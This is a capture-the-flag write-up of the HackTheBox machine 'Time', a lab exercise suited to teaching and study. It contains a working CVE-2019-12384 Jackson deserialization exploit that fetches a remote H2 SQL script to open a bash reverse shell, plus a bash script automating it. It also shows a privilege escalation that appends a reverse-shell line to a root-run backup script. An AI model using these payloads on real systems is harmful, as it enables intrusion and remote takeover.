---
date: "2021-02-19"
title: "HTB - Time"
desc: "A medium HackTheBox machine involving Jackson (JSON library) and system timers."
ref: "HackTheBox/machines/Time"
coverImage: "../../images/writeups/htb-time/logo.webp"
tags: [writeup, htb, json, jackson]
---

A rather short medium box - initial foothold using an older CVE that could take a little time to find, final privesc using a script root runs for us. Considering all of this it was still an interesting machine.

## table of contents

- [table of contents](#table-of-contents)
- [recon](#recon)
  - [nmap](#nmap)
  - [web server](#web-server)
- [foothold](#foothold)
  - [cves](#cves)
    - [description](#description)
  - [exploit](#exploit)
- [enumeration](#enumeration)
  - [linpeas](#linpeas)
- [privesc](#privesc)
- [further reading](#further-reading)

## recon

### nmap

First things first, as always, I kicked off an extensive port scan:

```bash
sudo nmap -vv -A -oA nmap/top 10.10.10.214
```

```txt
# Nmap 7.91 scan initiated Thu Feb 18 22:36:18 2021 as: nmap -vv -A -oA nmap/top 10.10.10.214
Increasing send delay for 10.10.10.214 from 0 to 5 due to 46 out of 151 dropped probes since last increase.
Nmap scan report for 10.10.10.214
Host is up, received echo-reply ttl 63 (0.15s latency).
Scanned at 2021-02-18 22:36:19 CET for 175s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqO75jA9cYksdPP+eBZBYzvJERbVfExL7kXpMJQpmpHoJdl9EG/wSsXgEH4BXsa56Rv2i32ClI7QvykILEpL6JyhHi3xS8vlNud8CQCYCYNCiBzpa84ucBbLpFaR331qH3n1PNrlBjvH0g4jmlQjlKMHRNSjxOS5XjO3JMYFhBkI3tZKXuo9dg/0wHwXXbGa5gFihkrTkGqinaPRACYC8FCgQ3UUpUzjTUUwSLMMMMAUJX+WkqPiD3++VCSmQmJn4rtOQK2PNzesJQFrHk5BLj6J2gfLUkgvVu2dMVCYAJ8Pom+sYRLq5dkBdaXugjpFXGWFXxYjh57h21HVtkdAVyObBu4iNlZQNYNPpYKuLbmTKdEv86FMfw/g1ZasV1q53gEc4vWyWVQSkarHXPyMYTY1nsFEIvkhGl8CsuwS0HioWaBRsF/+jQF+5Zty43VWJuu+PanAIOelmxAHrfNm//XrIW7RjqCLEDj0MpUeK4KUMx7WPuyE10zpESpuqhtAU=
|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCY27npy127v6WaSs6QO9MlX1RCjlp8ceQ0UyP6SfI+Q7UZrmg0qLFANnuqkm8iNio+TLTTOIAv5itdE0ahgzgE=
|   256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFy9CB1oSRwsAZJb6AMVD7/T0qxBk2G7/hV2Db57c0Kj
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/18%OT=22%CT=1%CU=36205%PV=Y%DS=2%DC=T%G=Y%TM=602EDE8
OS:3%P=x86_64-unknown-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A
OS:)SEQ(SP=FE%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW
OS:7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%
OS:W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DN
OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 11.370 days (since Sun Feb  7 13:45:44 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   561.66 ms 10.10.14.1
2   503.90 ms 10.10.10.214

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 18 22:39:15 2021 -- 1 IP address (1 host up) scanned in 176.53 seconds
```

... SSH is listening on port 22 and Apache on 80 - not too extraordinary. A full scan didn't present any more open ports.

### web server

Visiting the website, we are greeted by an "Online JSON Beautifier & Validator":

<div align="center">
    <img src="../../images/writeups/htb-time/web-landing.png" />
</div>

... while the `Beautify` mode doesn't seem too interesting, the `Validate (beta!)` option, on the other hand, seems to be all the more promising. Simply entering `{}` already gives us some useable output:

```txt
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
```

... this tells us that whatever JSON we enter will most likely be parsed by the `com.fasterxml.jackson` Java library in the backend. Let's go find ourselves a CVE, shall we?

## foothold

### cves

Okay, I have to admit, it take me quite some time to finally discover the right CVE, since there were quite a lot of similar ones out there ... ^^

Anyway, simply [searching MITRE](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=fasterxml) for a term like `fasterxml` will return quite many results. This is cool and all, but trying many of them by hand is rather tedious. So... I narrowed it down a bit by searching this *awesome* list of [CVE POCs](https://github.com/qazbnm456/awesome-cve-poc) instead. And ... the first one, [CVE-2019-12384](https://github.com/qazbnm456/awesome-cve-poc#cve-2019-12384), already worked!

#### description

For purposes of learning and not being a script kiddie, I took a closer look at what the exploit is actually doing and why it works. Here's a short summary.

The first part of the epxloit the one actually abusing a Jackson deserialization flaw makes use of the "gadget" `ch.qos.logback.core.db.DriverManagerConnectionSource` which can be passed a JDBC URL in its *"url"* attribute:

```json
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.206:8000/inject.sql'"}]
```

... if the Jackson deserializer is used with *default typing* enabled, the `DriverManagerConnectionSource` will be initialized with the given JDBC URL, which will in turn download and execute the `inject.sql` script from the attacking machine.

Because the database in question is the `H2` database, we can abuse its `CREATE ALIAS` to define and execute a Java function that opens up a reverse shell - the `inject.sql` could look something like ...

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
String[] command = {"bash", "-c", cmd};
java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.206/1337 0>&1')
```

### exploit

To make exploitation simpler and easier to repeat, I decided to write a little bash script that would automate execution:

```bash
#!/bin/bash

LHOST="10.10.14.206"
LPORT=1337
WPORT=8000
PAYLD="inject.sql"

if [[ $# -lt 1 ]]; then
    echo "Usage: $0 <target-url>"
    exit 1
fi

if [[ $# -ge 2 ]]; then
    LPORT=$2
fi

if [[ ! -d "exploit" ]]; then
    mkdir exploit
fi

cd exploit

echo 'CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
String[] command = {"bash", "-c", cmd};
java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('"'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1')" > inject.sql

/usr/bin/env python3 -m http.server $WPORT &
pypid=$!

echo "Start a reverse shell listener on :$LPORT and press <ENTER> ... "
echo "-> nc -lvnp $LPORT"
read

curl -X POST -d "mode=2&data=%5B%22ch.qos.logback.core.db.DriverManagerConnectionSource%22,%20%7B%22url%22:%22jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT%20FROM%20'http://$LHOST:$WPORT/$PAYLD'%22%7D%5D" --max-time 30 $1 >/dev/null

kill $pypid
```

... after executing it, we are presented with a reverse shell and can get the user flag:

```bash
cat ~/user.txt
```

```txt
6c0*****************************
```

## enumeration

### linpeas

Transferring `linpeas.sh` to the target machine and executing it reveals some rather interesting facts.

Several lines of the enumerations script output will tell you that there is an interesting writeable file in `/usr/bin/timer_backup.sh`, furthermore, in the *"System Timers"* section we can notice that the top timer has a rather similar name:

```txt
[+] System timers                                                                 
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                               
NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES                     
Sat 2021-02-20 23:14:01 UTC 4s left       Sat 2021-02-20 23:13:51 UTC 5s ago               timer_backup.timer           timer_backup.service
```

... taking a look at this timer/service in `/etc/systemd/system/timer_backup.[timer|service]` points us to yet another file - `/etc/systemd/system/web_backup.service`:

```bash
cat /etc/systemd/system/timer_backup.*
```

```txt
[Unit]
Description=Creates backups of the website

[Service]
ExecStart=/bin/bash /usr/bin/timer_backup.sh
pericles@time:/dev/shm$ cat /etc/systemd/system/timer_backup.*
[Unit]
Description=Calls website backup
Wants=timer_backup.timer
WantedBy=multi-user.target

[Service]
ExecStart=/usr/bin/systemctl restart web_backup.service
[Unit]
Description=Backup of the website
Requires=timer_backup.service

[Timer]
Unit=timer_backup.service
#OnBootSec=10s
#OnUnitActiveSec=10s
OnUnitInactiveSec=10s
AccuracySec=1ms

[Install]
WantedBy=timers.target
```

... and taking a look at that ...

```bash
cat /etc/systemd/system/web_backup.sh
```

```txt
[Unit]
Description=Creates backups of the website

[Service]
ExecStart=/bin/bash /usr/bin/timer_backup.sh
```

... it circles back to the intersting file `/usr/bin/timer_backup.sh` - which we can edit! 

## privesc

The discoveries made during enumeration make privesc rather trivial - simply append a line to spawn a reverse shell to the bash script that is run as root in periodical intervals:

```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.206/4443 0>&1"' >> /usr/bin/timer_backup.sh
```

... even though the shell isn't all too stable, it still provides us with more than enough time to retrieve the root flag:

```bash
cat ~/root.txt
```

```txt
ea1*****************************
```

## further reading

- [Jackson-databind and Default Typing Vulnerabilities](https://javachannel.org/posts/jackson-databind-and-default-typing-vulnerabilities/)
- [Abusing H2 Database ALIAS](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html)
- [CVE-2019-12384 - Blog Post](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
